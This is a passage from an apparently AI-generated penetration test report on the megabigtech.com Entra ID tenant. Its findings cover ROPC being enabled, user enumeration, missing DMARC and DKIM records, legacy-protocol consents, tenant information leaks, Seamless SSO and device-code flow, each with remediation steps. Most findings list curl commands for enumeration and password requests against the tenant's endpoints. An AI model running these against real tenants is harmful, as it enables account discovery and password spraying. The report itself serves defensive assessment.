| **Status** | CONFIRMED |
| **Category** | `authentication_bypass` |
| **MITRE ATT&CK** | `T1078.004` — Valid Accounts: Cloud Accounts |
| **ISO 27001** | `A.9.4.2` |
| **Endpoint** | `https://login.microsoftonline.com/2590ccef-687d-493b-ae8d-441cbab63a72...` |
| **Component** | Microsoft Entra ID OAuth2 ROPC Flow |
| **Discovered by** | `entraid` |
| **Discovered at** | 2026-08-02T11:48:42Z |

#### Description

The megabigtech.com Entra ID tenant (2590ccef-687d-493b-ae8d-441cbab63a72) accepts ROPC (Resource Owner Password Credential) OAuth2 grant type requests via the Azure PowerShell public client application (04b07795-8ddb-461a-bbee-02f9e1bf7b46). The ROPC flow allows direct username/password authentication without interactive login, bypassing MFA controls. When tested against the tenant-specific endpoint (/organizations and tenant-ID endpoint), the token endpoint processed the request and returned user-specific errors (AADSTS50034 for non-existent users) rather than rejecting the ROPC grant type itself (AADSTS7000218). This confirms ROPC is enabled. The leaked script in the deleted blob was designed to exploit this exact flow for automated user enumeration. ROPC is considered a legacy authentication flow that Microsoft recommends disabling.

#### Technical Analysis

The ROPC flow is confirmed as enabled on the megabigtech.com Entra ID tenant. When sending ROPC requests to the tenant-specific token endpoint, the server returns AADSTS50034 (user not found) rather than AADSTS7000218 (ROPC not allowed). This is significant because: (1) ROPC bypasses MFA since it's a non-interactive flow, (2) it allows automated password spraying attacks, (3) the leaked script was specifically designed to use this flow for Graph API user enumeration, and (4) Microsoft explicitly recommends disabling ROPC as a legacy authentication method. Combined with the user enumeration vulnerability, an attacker who discovers valid usernames could attempt password spraying through this endpoint without triggering MFA prompts.

#### Exploitation Commands

```bash
curl -s -X POST "https://login.microsoftonline.com/2590ccef-687d-493b-ae8d-441cbab63a72/oauth2/v2.0/token" -d "grant_type=password&client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&scope=https://graph.microsoft.com/.default&username=admin@megabigtech.com&password=[REDACTED_CREDENTIAL]"
curl -s -X POST "https://login.microsoftonline.com/organizations/oauth2/v2.0/token" -d "grant_type=password&client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&scope=https://graph.microsoft.com/.default&username=admin@megabigtech.com&password=[REDACTED_CREDENTIAL]"
```

#### Raw Request

```http
POST https://login.microsoftonline.com/2590ccef-687d-493b-ae8d-441cbab63a72/oauth2/v2.0/token HTTP/1.1
Content-Type: application/x-www-form-urlencoded

grant_type=password&client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&scope=https://graph.microsoft.com/.default&username=admin@megabigtech.com&password=[REDACTED_CREDENTIAL]
```

#### Raw Response

```http
{"error":"invalid_grant","error_description":"AADSTS50034: The user account {EUII Hidden} does not exist in the 2590ccef-687d-493b-ae8d-441cbab63a72 directory.","error_codes":[50034],"timestamp":"2026-08-02 11:43:55Z","trace_id":"275596c4-5c4f-404b-9fa7-99d4f7b61400"}
```

#### Evidence / Logs

```
Tenant-specific ROPC endpoint response: {"error":"invalid_grant","error_description":"AADSTS50034: The user account does not exist...","error_codes":[50034]}
Organizations endpoint response: {"error":"invalid_grant","error_description":"AADSTS50034: The user account does not exist...","error_codes":[50034]}
Common endpoint response: {"error":"invalid_request","error_description":"AADSTS9001023: The grant type is not supported over the /common...","error_codes":[9001023]}
Key: Error 50034 (user not found) proves ROPC is processed — if ROPC were disabled, error 7000218 would be returned instead.
```

#### Remediation

1. Block ROPC flow using Conditional Access policies that block legacy authentication. 2. Create a Conditional Access policy requiring MFA for all users, which effectively blocks ROPC. 3. Disable the Azure PowerShell public client application if not required. 4. Configure Security Defaults to block legacy authentication protocols. 5. Monitor sign-in logs for ROPC authentication attempts (authentication method 'password' without interactive flag). 6. If ROPC is required for automation, restrict it to specific service accounts with Conditional Access named locations.

---

### 3.23 — Entra ID Tenant User Enumeration via GetCredentialType API

| Field | Value |
|-------|-------|
| **ID** | `vuln_746a23` |
| **Severity** | MEDIUM |
| **CVSS Score** | 5.3 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `information_disclosure` |
| **MITRE ATT&CK** | `T1589.002` — Gather Victim Identity Information: Email Addresses |
| **ISO 27001** | `A.9.4.2` |
| **Endpoint** | `https://login.microsoftonline.com/common/GetCredentialType` |
| **Component** | Microsoft Entra ID GetCredentialType API |
| **Discovered by** | `entraid` |
| **Discovered at** | 2026-08-02T11:48:16Z |

#### Description

The Microsoft Entra ID tenant megabigtech.com (tenant ID: 2590ccef-687d-493b-ae8d-441cbab63a72) exposes user existence information through the GetCredentialType API endpoint. This unauthenticated API returns IfExistsResult=0 for valid users and IfExistsResult=1 for non-existent users, allowing an attacker to enumerate valid usernames without authentication. The API is accessible at https://login.microsoftonline.com/common/GetCredentialType and does not require any credentials. This was confirmed by testing multiple usernames and observing consistent differential responses. The same user enumeration oracle exists via the ROPC token endpoint, which returns AADSTS50034 (user not found) for non-existent accounts versus different error codes for existing accounts with wrong passwords.

#### Technical Analysis

The GetCredentialType API at login.microsoftonline.com allows unauthenticated user enumeration against the megabigtech.com Entra ID tenant. By sending POST requests with different usernames, an attacker can determine whether a user account exists based on the IfExistsResult field (0=exists, 1=not found). Additionally, the ROPC token endpoint leaks user existence through distinct error codes: AADSTS50034 for non-existent users versus AADSTS50126 for wrong passwords on existing users. This enables attackers to build a valid username list for targeted password spraying or phishing attacks. The API also leaks domain configuration details (DomainType, NameSpaceType=Managed, FederationBrandName=Default Directory).

#### Exploitation Commands

```bash
curl -s -X POST "https://login.microsoftonline.com/common/GetCredentialType" -H "Content-Type: application/json" -d '{"Username":"admin@megabigtech.com"}'
curl -s -X POST "https://login.microsoftonline.com/2590ccef-687d-493b-ae8d-441cbab63a72/oauth2/v2.0/token" -d "grant_type=password&client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&scope=https://graph.microsoft.com/.default&username=admin@megabigtech.com&password=[REDACTED_CREDENTIAL]"
```

#### Raw Request

```http
POST https://login.microsoftonline.com/common/GetCredentialType HTTP/1.1
Content-Type: application/json

{"Username":"admin@megabigtech.com"}
```

#### Raw Response

```http
{"IfExistsResult":1,"ThrottleStatus":0,"EstsProperties":{"DomainType":4}}
```

#### Evidence / Logs

```
GetCredentialType Response for admin@megabigtech.com: {"ifExistsResult":1,"throttleStatus":0} (IfExistsResult=1 means user does not exist)
ROPC Token Response: AADSTS50034: The user account does not exist in the 2590ccef-687d-493b-ae8d-441cbab63a72 directory (error_code: 50034)
GetCredentialType also reveals DomainType: megabigtech.com returns DomainType=4 (custom/verified), megabigtech.onmicrosoft.com returns DomainType=3, mbtwebsite.onmicrosoft.com returns DomainType=1 (managed)
```

#### Remediation

1. This is a Microsoft platform-level behavior that cannot be fully mitigated by tenant administrators. 2. Consider implementing Conditional Access policies with sign-in risk detection to detect and block user enumeration attempts. 3. Enable Azure AD Identity Protection to flag suspicious enumeration activity. 4. Ensure all user accounts use strong, unique passwords since usernames may be discoverable. 5. Deploy MFA on all accounts to mitigate password-spraying attacks enabled by user enumeration. 6. Monitor sign-in logs for high-volume failed authentication attempts indicating enumeration.

---

### 3.24 — Missing DMARC and DKIM Email Authentication Records

| Field | Value |
|-------|-------|
| **ID** | `vuln_ce3b0c` |
| **Severity** | MEDIUM |
| **CVSS Score** | 5.3 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N` |
| **Status** | CONFIRMED |
| **Category** | `misconfig` |
| **MITRE ATT&CK** | `T1566.002` — Phishing: Spearphishing Link |
| **ISO 27001** | `A.13.2.1` |
| **Endpoint** | `megabigtech.com (DNS)` |
| **Component** | DNS Email Authentication (DMARC/DKIM) |
| **Discovered by** | `entraid` |
| **Discovered at** | 2026-08-02T11:51:10Z |

#### Description

The megabigtech.com domain is configured to use Microsoft 365 Exchange Online for email (MX: megabigtech-com.mail.protection.outlook.com) with SPF configured (v=spf1 include:spf.protection.outlook.com -all). However, critical email authentication records are missing: (1) No DMARC record exists at _dmarc.megabigtech.com - without DMARC, receiving mail servers may not enforce SPF failures, allowing email spoofing, (2) No DKIM records found at selector1._domainkey.megabigtech.com or selector2._domainkey.megabigtech.com - Microsoft 365 DKIM signing is not configured, emails lack cryptographic signature verification. Additionally, Google Site Verification (google-site-verification=eJ1dP34-PLUDUdzRLTanKADI1_FPw8TFZllOwWqWr9E) is present alongside Microsoft services, indicating potential dual-platform usage. DNS is hosted on GoDaddy (ns39/ns40.domaincontrol.com).

#### Technical Analysis

The megabigtech.com domain uses Microsoft 365 Exchange Online for email services but has critical gaps in email authentication configuration. While SPF is properly configured with a hard fail policy (-all), there is no DMARC record to instruct receiving servers on how to handle authentication failures, and DKIM signing has not been configured for the Microsoft 365 selectors. Without DMARC, even with SPF hard fail, many receiving mail servers may deliver spoofed emails that fail SPF checks. Without DKIM, emails from the domain cannot be cryptographically verified. This combination enables email spoofing and phishing attacks impersonating the organization, which is particularly concerning for an organization with Entra ID credentials already exposed through other vectors.

#### Exploitation Commands

```bash
dig +short _dmarc.megabigtech.com TXT
dig +short selector1._domainkey.megabigtech.com CNAME
dig +short selector2._domainkey.megabigtech.com CNAME
dig +short MX megabigtech.com
dig +short TXT megabigtech.com
```

#### Raw Request

```http
dig +short _dmarc.megabigtech.com TXT
```

#### Raw Response

```http
[NO OUTPUT] - No DMARC record exists
```

#### Evidence / Logs

```
MX Record: 0 megabigtech-com.mail.protection.outlook.com (Exchange Online)
SPF Record: v=spf1 include:spf.protection.outlook.com -all (hard fail - good)
DMARC (_dmarc.megabigtech.com TXT): NO RECORD FOUND
DKIM selector1._domainkey.megabigtech.com CNAME: NO RECORD FOUND
DKIM selector2._domainkey.megabigtech.com CNAME: NO RECORD FOUND
Microsoft Verification: MS=ms68534586
Google Verification: google-site-verification=eJ1dP34-PLUDUdzRLTanKADI1_FPw8TFZllOwWqWr9E
NS: ns39.domaincontrol.com, ns40.domaincontrol.com (GoDaddy)
```

#### Remediation

1. Configure DMARC by adding a TXT record at _dmarc.megabigtech.com: 'v=DMARC1; p=quarantine; rua=mailto:dmarc-reports@megabigtech.com'. 2. Enable DKIM signing in Microsoft 365 Defender (Exchange Admin Center > Email authentication > DKIM). 3. Start with p=none for monitoring, then progress to p=quarantine and p=reject. 4. Review if the Google Site Verification is still needed or represents an abandoned configuration. 5. Consider migrating DNS to Azure DNS for tighter integration with Microsoft 365. 6. Set up DMARC aggregate reporting to monitor email authentication results.

---

### 3.25 — Legacy Auth Protocol Consent (IMAP/POP/SMTP) Enabled for Users

| Field | Value |
|-------|-------|
| **ID** | `vuln_49948d` |
| **Severity** | MEDIUM |
| **CVSS Score** | 5.3 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N` |
| **Status** | CONFIRMED |
| **Category** | `misconfiguration` |
| **MITRE ATT&CK** | `T1114.002` — Email Collection: Remote Email Collection |
| **ISO 27001** | `A.13.2.1` |
| **Endpoint** | `https://graph.microsoft.com/v1.0/oauth2PermissionGrants` |
| **Component** | Exchange Online Legacy Auth Protocols |
| **Discovered by** | `entra` |
| **Discovered at** | 2026-08-02T12:02:25Z |

#### Description

OAuth2 permission grants show users (Clara Miller - 36fa333d, Lindsey Miller - 61790ddd) have consented to IMAP.AccessAsUser.All, POP.AccessAsUser.All, and SMTP.Send scopes for client f7c62f39. Legacy authentication protocols (IMAP/POP/SMTP basic auth via OAuth) bypass MFA and are commonly exploited for credential stuffing and persistent email access. These grants allow direct mailbox access without interactive authentication.

#### Technical Analysis

Two users have active OAuth consent grants for legacy email protocols (IMAP, POP, SMTP). These protocols can bypass MFA requirements and provide persistent mailbox access. The offline_access scope means refresh tokens are issued, enabling long-lived access. In a real attack, compromising these users' tokens would provide silent, persistent email surveillance and the ability to send email as the user.

#### Exploitation Commands

```bash
curl -s -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/oauth2PermissionGrants" | jq '.value[] | select(.scope | test("IMAP|POP|SMTP"))'
```

#### Evidence / Logs

```
Grant 1: clientId=f7c62f39, principalId=36fa333d (Clara Miller), scope=IMAP.AccessAsUser.All POP.AccessAsUser.All SMTP.Send offline_access
Grant 2: clientId=f7c62f39, principalId=61790ddd (Lindsey Miller), scope=IMAP.AccessAsUser.All POP.AccessAsUser.All SMTP.Send offline_access
```

#### Remediation

1. Block legacy authentication protocols via Conditional Access. 2. Revoke existing IMAP/POP/SMTP consent grants. 3. Disable IMAP/POP at the Exchange Online level for users who don't need it. 4. Monitor for new legacy auth consent grants.

---

### 3.26 — Entra ID Tenant Information Disclosure via Unauthenticated Endpoints

| Field | Value |
|-------|-------|
| **ID** | `vuln_d5b275` |
| **Severity** | LOW |
| **CVSS Score** | 3.7 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `information_disclosure` |
| **MITRE ATT&CK** | `T1590.001` — Gather Victim Network Information: Domain Properties |
| **ISO 27001** | `A.13.1.1` |
| **Endpoint** | `https://login.microsoftonline.com/megabigtech.com/.well-known/openid-c...` |
| **Component** | Microsoft Entra ID OIDC/SAML Metadata |
| **Discovered by** | `entraid` |
| **Discovered at** | 2026-08-02T11:49:11Z |

#### Description

Multiple unauthenticated Microsoft Entra ID endpoints expose sensitive tenant configuration details for megabigtech.com. The following information is disclosed without any authentication: (1) Tenant ID: 2590ccef-687d-493b-ae8d-441cbab63a72, (2) Tenant region: EU, (3) Authentication type: Managed (not federated/ADFS), (4) Federation brand name: 'Default Directory' (indicates default tenant naming), (5) Domain types: megabigtech.com is a verified custom domain, megabigtech.onmicrosoft.com is the initial domain, (6) SAML/WS-Fed signing certificates with full X.509 data exposed, (7) Token endpoint configuration including supported auth methods, (8) Device code flow endpoint availability, (9) Kerberos endpoint availability (suggesting hybrid AD potential). This information facilitates targeted attacks against the tenant.

#### Technical Analysis

Multiple unauthenticated API endpoints associated with Microsoft Entra ID leak detailed tenant configuration information for megabigtech.com. The OpenID Connect discovery endpoint reveals the tenant ID, region (EU), and supported authentication flows. The getuserrealm.srf endpoint confirms the domain is Managed (cloud-only, no ADFS federation) with a default directory name. The federation metadata exposes full X.509 SAML signing certificates. While some of this information is by-design for OIDC interoperability, the aggregate disclosure enables an attacker to fingerprint the tenant's authentication architecture, identify potential attack vectors (ROPC enabled, device code flow available, Kerberos endpoint suggesting hybrid AD), and plan targeted attacks without any prior authentication.

#### Exploitation Commands

```bash
curl -s "https://login.microsoftonline.com/megabigtech.com/.well-known/openid-configuration"
curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=admin@megabigtech.com&json=1"
curl -s "https://login.microsoftonline.com/2590ccef-687d-493b-ae8d-441cbab63a72/v2.0/.well-known/openid-configuration"
curl -s "https://login.microsoftonline.com/2590ccef-687d-493b-ae8d-[REDACTED]-06/federationmetadata.xml"
```

#### Raw Request

```http
GET https://login.microsoftonline.com/getuserrealm.srf?login=admin@megabigtech.com&json=1 HTTP/1.1
```

#### Raw Response

```http
{"State":4,"UserState":1,"Login":"admin@megabigtech.com","NameSpaceType":"Managed","DomainName":"megabigtech.com","FederationBrandName":"Default Directory","CloudInstanceName":"microsoftonline.com","CloudInstanceIssuerUri":"urn:federation:MicrosoftOnline"}
```

#### Evidence / Logs

```
OIDC Discovery: issuer=https://sts.windows.net/2590ccef-687d-493b-ae8d-441cbab63a72/, tenant_region_scope=EU
UserRealm: State=4, UserState=1, NameSpaceType=Managed, DomainName=megabigtech.com, FederationBrandName=Default Directory
Federation Metadata: Full SAML signing certificates exposed (7 X.509 certificates), SAML SSO endpoints at /saml2
v2.0 OIDC: device_authorization_endpoint available, kerberos_endpoint available, tls_client_certificate_bound_access_tokens=true
```

#### Remediation

1. This is largely a Microsoft platform design choice for OIDC interoperability. 2. Ensure tenant branding is properly configured (FederationBrandName should not be 'Default Directory'). 3. Monitor for reconnaissance activity against these endpoints via Azure AD sign-in and audit logs. 4. Disable unnecessary authentication flows (device code, ROPC) via Conditional Access. 5. If the Kerberos endpoint is not needed, evaluate hybrid AD configuration. 6. Consider if all exposed domains are intentionally registered and configured.

---

### 3.27 — Seamless SSO (DesktopSsoEnabled) Active - Hybrid AD Configuration Exposed

| Field | Value |
|-------|-------|
| **ID** | `vuln_67e36d` |
| **Severity** | LOW |
| **CVSS Score** | 3.7 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `information_disclosure` |
| **MITRE ATT&CK** | `T1558.003` — Steal or Forge Kerberos Tickets: Kerberoasting |
| **ISO 27001** | `A.9.2.3` |
| **Endpoint** | `https://login.microsoftonline.com/common/GetCredentialType` |
| **Component** | Azure AD Connect / Seamless SSO |
| **Discovered by** | `entraid` |
| **Discovered at** | 2026-08-02T11:50:26Z |

#### Description

The megabigtech.com Entra ID tenant has Seamless SSO (DesktopSsoEnabled) enabled, as revealed by the unauthenticated GetCredentialType API response. This confirms the tenant operates in a hybrid Active Directory configuration with Azure AD Connect synchronizing on-premises AD with Entra ID. Seamless SSO requires an AZUREADSSOACC computer account in on-premises AD whose Kerberos decryption key, if compromised, allows Silver Ticket attacks to forge Entra ID authentication tokens. The GetCredentialType response also leaks custom tenant branding (banner logo, illustration, favicon at aadcdn.msauthimages.net), background color (#120349), and configuration flags (KeepMeSignedInDisabled=false, IsSignupDisallowed=true, PrefCredential=1/password). This information is valuable for crafting convincing phishing pages that mimic the organization's login experience.

#### Technical Analysis

The GetCredentialType API endpoint reveals that Seamless SSO is enabled for the megabigtech.com domain, confirming a hybrid Active Directory deployment with Azure AD Connect. This has significant security implications: (1) The AZUREADSSOACC computer account's Kerberos decryption key in on-premises AD can be used for Silver Ticket attacks against Entra ID, (2) PHS/PTA configurations may expose password hashes or authentication proxies, (3) the Azure AD Connect sync account has high privileges in both AD and Entra ID. The response also leaks custom tenant branding assets (logos, colors, favicons) that enable pixel-perfect phishing page creation. This should be cross-referenced with on-premises Active Directory assessment findings.

#### Exploitation Commands

```bash
curl -s -X POST "https://login.microsoftonline.com/common/GetCredentialType" -H "Content-Type: application/json" -d '{"Username":"admin@megabigtech.com","isOtherIdpSupported":true,"checkPhones":true,"isRemoteNGCSupported":true}'
```

#### Raw Request

```http
POST https://login.microsoftonline.com/common/GetCredentialType HTTP/1.1
Content-Type: application/json

{"Username":"admin@megabigtech.com","isOtherIdpSupported":true,"checkPhones":true,"isRemoteNGCSupported":true}
```

#### Raw Response

```http
{"IfExistsResult":1,"IsUnmanaged":false,"ThrottleStatus":0,"Credentials":{"PrefCredential":1,"HasPassword":true},"EstsProperties":{"DesktopSsoEnabled":true,"UserTenantBranding":[{"Locale":0,"BannerLogo":"https://aadcdn.msauthimages.net/c1c6b6c8-...[REDACTED]","BackgroundColor":"#120349"}],"DomainType":3},"IsSignupDisallowed":true}
```

#### Evidence / Logs

```
GetCredentialType extended response:
- DesktopSsoEnabled: true (Seamless SSO active = hybrid AD with Azure AD Connect)
- DomainType: 3 
- PrefCredential: 1, HasPassword: true
- IsSignupDisallowed: true
- KeepMeSignedInDisabled: false (KMSI enabled)
- Custom branding: BannerLogo, Illustration, Favicon at aadcdn.msauthimages.net/c1c6b6c8-*/logintenantbranding/
- BackgroundColor: #120349
- Kerberos endpoint available at /kerberos (confirms hybrid AD)
```

#### Remediation

1. Regularly rotate the AZUREADSSOACC Kerberos decryption key (recommended every 30 days). 2. Protect the Azure AD Connect server as Tier 0 infrastructure. 3. Enable Conditional Access policies requiring compliant devices to mitigate Seamless SSO abuse. 4. Monitor Azure AD Connect sync account for suspicious activity. 5. Consider implementing Entra ID Password Protection to prevent weak on-premises passwords from syncing.

---

### 3.28 — Device Code Flow Enabled - Potential Phishing Vector

| Field | Value |
|-------|-------|
| **ID** | `vuln_5bc867` |
| **Severity** | LOW |
| **CVSS Score** | 3.1 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N` |
| **Status** | UNCONFIRMED |
| **Category** | `authentication_bypass` |
| **MITRE ATT&CK** | `T1528` — Steal Application Access Token |
| **ISO 27001** | `A.9.4.2` |
| **Endpoint** | `https://login.microsoftonline.com/2590ccef-687d-493b-ae8d-441cbab63a72...` |
| **Component** | Microsoft Entra ID Device Code Flow |
| **Discovered by** | `entraid` |
| **Discovered at** | 2026-08-02T11:49:33Z |

#### Description

The megabigtech.com Entra ID tenant exposes a device_authorization_endpoint at https://login.microsoftonline.com/2590ccef-687d-493b-ae8d-441cbab63a72/oauth2/v2.0/devicecode, indicating the device code authentication flow is available. Device code phishing is a well-documented attack technique where an attacker initiates a device code flow, then socially engineers a victim into entering the code at microsoft.com/devicelogin. If successful, the attacker receives the victim's access and refresh tokens, bypassing MFA. This finding is reported as unconfirmed because the attack requires social engineering of a real user, which was not performed per engagement rules. The endpoint availability was confirmed via the OIDC discovery metadata.

#### Technical Analysis

The Entra ID tenant's OIDC discovery metadata exposes a device_authorization_endpoint, confirming that the device code OAuth2 flow is available. This flow is a known phishing vector: an attacker can initiate a device code request, receive a user code, and then trick a victim into authenticating at microsoft.com/devicelogin with that code. If the victim completes authentication (including MFA), the attacker receives full access and refresh tokens. This effectively bypasses MFA protections. The attack was not executed (per rules against phishing real users), but the availability of the endpoint combined with the lack of confirmed Conditional Access policies blocking device code flow represents a potential attack path.

#### Exploitation Commands

```bash
curl -s "https://login.microsoftonline.com/2590ccef-687d-493b-ae8d-441cbab63a72/v2.0/.well-known/openid-configuration" | jq -r .device_authorization_endpoint
```

#### Evidence / Logs

```
OIDC Discovery reveals device_authorization_endpoint: https://login.microsoftonline.com/2590ccef-687d-493b-ae8d-441cbab63a72/oauth2/v2.0/devicecode
This endpoint is present in both v1.0 and v2.0 OIDC metadata
No Conditional Access policy blocking device code flow was confirmed (would require authenticated access to verify)
```

#### Remediation

1. Create a Conditional Access policy to block the device code flow for all users or restrict it to specific scenarios. 2. Configure Conditional Access to require compliant devices, which blocks device code phishing from unmanaged devices. 3. Train users to recognize device code phishing attacks. 4. Monitor sign-in logs for device code flow authentications from unexpected locations or devices. 5. Consider requiring Authentication Strength policies that block device code flow.

---

## 4. REMEDIATION ROADMAP

### P0 — Immediate (< 24h)

| Finding | Effort |
|---------|--------|
| Tenant Takeover Path: Marcus -> it-helpdesk-app (Priv Auth A... | High |
| Deleted Blob with Credentials Recoverable via Azure Blob Ver... | High |
| Hardcoded Entra ID (Azure AD) User Credentials in PowerShell... | High |
| Hardcoded On-Premises Active Directory Admin Credentials in ... | High |
| Deleted Blob scripts-transfer.zip Recoverable via Anonymous ... | High |
| Hardcoded Entra ID Credential in Recovered Script (entra_use... | High |

### P1 — Short term (< 1 week)

| Finding | Effort |
|---------|--------|
| Azure Blob Versioning Exposes Deleted Sensitive Files to Ano... | High |
| Azure Blob Versioning Exposes Deleted Files to Anonymous Use... | High |
| Excessive Global Administrator Accounts - 6 Users with Tenan... | High |
| Azure Blob Storage Container Publicly Accessible - Anonymous... | High |
| Azure Blob Storage $web Container Allows Anonymous Listing a... | High |
| Hardcoded Credential Leaked in Azure Blob Storage (Deleted B... | High |

### P2 — Medium term (< 2 weeks)

| Finding | Effort |
|---------|--------|
| ROPC (Resource Owner Password Credential) Flow Enabled on Te... | High |
| Entra ID Tenant User Enumeration via GetCredentialType API | High |
| Missing DMARC and DKIM Email Authentication Records | High |
| Legacy Auth Protocol Consent (IMAP/POP/SMTP) Enabled for Use... | High |

### P3 — Long term (< 1 month)

| Finding | Effort |
|---------|--------|
| Entra ID Tenant Information Disclosure via Unauthenticated E... | High |
| Seamless SSO (DesktopSsoEnabled) Active - Hybrid AD Configur... | High |
| Device Code Flow Enabled - Potential Phishing Vector | High |

---

*Report auto-generated by Darkmoon AI Security Platform*  
*Classification: CONFIDENTIAL — Restricted to authorized personnel*  
*Generated: 2026-08-02T12:04:44Z*  
*Campaign: camp_20260802_7eee391f | Target: dev.megabigtech.com*
